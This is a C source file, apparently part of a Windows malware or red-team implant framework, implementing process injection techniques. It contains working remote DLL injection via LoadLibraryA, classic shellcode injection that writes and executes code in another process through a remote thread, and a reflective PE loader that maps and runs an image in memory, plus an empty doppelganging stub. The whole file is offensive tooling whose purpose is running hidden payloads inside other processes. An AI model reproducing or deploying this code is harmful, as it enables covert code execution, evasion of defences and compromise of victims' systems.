#include <common.h>

FUNC UINT32 InjectionDll(
    UINT32 ProcessId,
    PSTR   DllPath
) {
    BLACKOUT_INSTANCE

    HANDLE ProcessHandle = NULL;
    HANDLE ThreadHandle  = NULL;
    UINT32 bkErrorCode   = 0;
    PVOID  MemoryAlloc   = NULL;

    if ( ProcessId != 0 ) {
        bkErrorCode = bkProcessOpen( PROCESS_VM_READ | PROCESS_VM_WRITE , FALSE, ProcessId, &ProcessHandle );
        if ( bkErrorCode != 0 ) goto _Leave;
    }

    bkErrorCode = bkMemAlloc( ProcessHandle, &MemoryAlloc, StringLengthA( DllPath ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( bkErrorCode != 0 ) goto _Leave;

    bkErrorCode = bkMemWrite( ProcessHandle, MemoryAlloc, DllPath, StringLengthA( DllPath ) );
    if ( bkErrorCode != 0 ) goto _Leave;
    
    bkErrorCode = bkThreadCreate( ProcessHandle, Instance()->Win32.LoadLibraryA, MemoryAlloc, 0, 0, 0, &ThreadHandle );
    if ( bkErrorCode != 0 ) goto _Leave;
    
_Leave:
    if ( ProcessHandle ) bkHandleClose( ProcessHandle );

    return bkErrorCode;
}

FUNC UINT32 InjectionClassic(
    UINT32 ProcessId,
    PBYTE  ShellcodeBuffer,
    UINT64 ShellcodeSize,
    PVOID  ShellcodeMemory,
    UINT32 ThreadId
) {
    HANDLE ProcessHandle = NULL;
    HANDLE ThreadHandle  = NULL;
    UINT32 bkErrorCode   = 0;

    if ( ProcessId != 0 ) {
        bkErrorCode = bkProcessOpen( PROCESS_VM_READ | PROCESS_VM_WRITE , FALSE, ProcessId, &ProcessHandle );
        if ( bkErrorCode != 0 ) goto _Leave;
    }

    bkErrorCode = bkMemAlloc( ProcessHandle, &ShellcodeMemory, ShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( bkErrorCode != 0 ) goto _Leave;

    bkErrorCode = bkMemWrite( ProcessHandle, ShellcodeMemory, ShellcodeBuffer, ShellcodeSize );
    if ( bkErrorCode != 0 ) goto _Leave;

    bkErrorCode = bkMemProtect( ProcessHandle, ShellcodeMemory, ShellcodeSize, PAGE_EXECUTE_READ );
    if ( bkErrorCode != 0 ) goto _Leave;

    bkErrorCode = bkThreadCreate( ProcessHandle, ShellcodeMemory, NULL, 0, 0, &ThreadId, &ThreadHandle );
    if ( bkErrorCode != 0 ) goto _Leave;

_Leave:
    if ( ThreadHandle  ) bkHandleClose( ThreadHandle  );
    if ( ProcessHandle ) bkHandleClose( ProcessHandle );

    return bkErrorCode;
}

FUNC VOID InjectionDoppelganging(

) {

}

FUNC PVOID InjectionReflective(
    _In_ HANDLE ProcessHandle,
    _In_ PBYTE  PeBytes,
    _In_ UINT64 PeSize,
    _In_ PSTR   Args
) {
    BLACKOUT_INSTANCE

    VOID(*bkDllMain)( HINSTANCE, UINT32, PVOID );
    VOID(*bkWinMain)( HINSTANCE, HINSTANCE, LPSTR, INT );

    PVOID                 BaseAddress = NULL;
    PIMAGE_NT_HEADERS     ImgNtHdrs   = { 0 };
    PIMAGE_SECTION_HEADER ImgSecHdr   = { 0 };
    PIMAGE_DATA_DIRECTORY EntryImport = { 0 };
    PIMAGE_DATA_DIRECTORY EntryReloc  = { 0 };
    PIMAGE_DATA_DIRECTORY EntryExcept = { 0 };
    PIMAGE_DATA_DIRECTORY EntryTls    = { 0 };
    PIMAGE_DATA_DIRECTORY EntryExport = { 0 };
    UINT32                ImageSize   = 0;
    UINT32                bkErrorCode = 0;
    UINT32                RelocOffset = 0;
    BOOL                  IsDll       = FALSE;

    ImgNtHdrs   = U_PTR( PeBytes ) + ( ( PIMAGE_DOS_HEADER )( PeBytes ) )->e_lfanew;
    ImgSecHdr   = IMAGE_FIRST_SECTION( ImgNtHdrs );
    ImageSize   = ImgNtHdrs->OptionalHeader.SizeOfImage;
    EntryImport = &ImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    EntryReloc  = &ImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    EntryExcept = &ImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    EntryTls    = &ImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    EntryExport = &ImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    if ( ImgNtHdrs->FileHeader.Characteristics & IMAGE_FILE_DLL ) IsDll = TRUE;

    bkMemAlloc( ProcessHandle, &BaseAddress, ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    for ( INT i = 0; i < ImgNtHdrs->FileHeader.NumberOfSections; i++ ) {
        MmCopy(
            C_PTR( BaseAddress + ImgSecHdr[i].VirtualAddress ),
            C_PTR( PeBytes + ImgSecHdr[i].PointerToRawData ),
            ImgSecHdr[i].SizeOfRawData
        );
    }

    RelocOffset = U_PTR( BaseAddress ) - ImgNtHdrs->OptionalHeader.ImageBase;

    ResolveIat( EntryImport, BaseAddress );
    FixRelocTable( EntryReloc, BaseAddress, RelocOffset );

    BK_PRINT( "aaa\n" );

    for ( int i = 0; i < ImgNtHdrs->FileHeader.NumberOfSections; i++ ) {

		UINT32 dwProtection = 0x00;

		if ( !ImgSecHdr[i].SizeOfRawData || !ImgSecHdr[i].VirtualAddress )
			continue;

		if ( ImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE )
			dwProtection = PAGE_WRITECOPY;

		if ( ImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ )
			dwProtection = PAGE_READONLY;

		if ( ( ImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && (ImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			dwProtection = PAGE_READWRITE;

		if ( ImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE )
			dwProtection = PAGE_EXECUTE;

		if ( ( ImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( ImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
			dwProtection = PAGE_EXECUTE_WRITECOPY;

		if ( ( ImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( ImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) ) 
			dwProtection = PAGE_EXECUTE_READ;

		if ( ( ImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( ImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( ImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			dwProtection = PAGE_EXECUTE_READWRITE;

		bkMemProtect( ProcessHandle, C_PTR( BaseAddress + ImgSecHdr[i].VirtualAddress ), ImgSecHdr[i].SizeOfRawData, dwProtection );
	}

    if ( EntryExcept->Size ) {
        PIMAGE_RUNTIME_FUNCTION_ENTRY ImgRunFuncEntry = C_PTR( BaseAddress + EntryExcept->VirtualAddress );
        Instance()->Win32.RtlAddFunctionTable( (PRUNTIME_FUNCTION)( ImgRunFuncEntry ), ( EntryExcept->Size / sizeof( IMAGE_RUNTIME_FUNCTION_ENTRY ) ), BaseAddress );
    }

    if ( EntryTls->Size ) {
        PIMAGE_TLS_DIRECTORY ImgTlsDir      = C_PTR( BaseAddress + EntryTls->VirtualAddress );
        PIMAGE_TLS_CALLBACK* ImgTlsCallback = (PIMAGE_TLS_CALLBACK*)( ImgTlsDir->AddressOfCallBacks );

        for ( INT i = 0; ImgTlsCallback[i]; i++ ) {
            ImgTlsCallback[i]( BaseAddress, DLL_PROCESS_ATTACH, NULL );
        }
    }

    Instance()->Win32.NtFlushInstructionCache( NtCurrentProcess(), NULL, 0 );

    UINT64 EntryPoint = U_PTR( BaseAddress ) + ImgNtHdrs->OptionalHeader.AddressOfEntryPoint;

    if ( IsDll ) {
        bkDllMain = EntryPoint;
        bkDllMain( BaseAddress, DLL_PROCESS_ATTACH, Args );
    } else {
        bkWinMain = EntryPoint;
        bkWinMain( BaseAddress, NULL, Args, FALSE );
    }    

    //bkMemFree( ProcessHandle, BaseAddress, ImageSize );

    return BaseAddress;
}
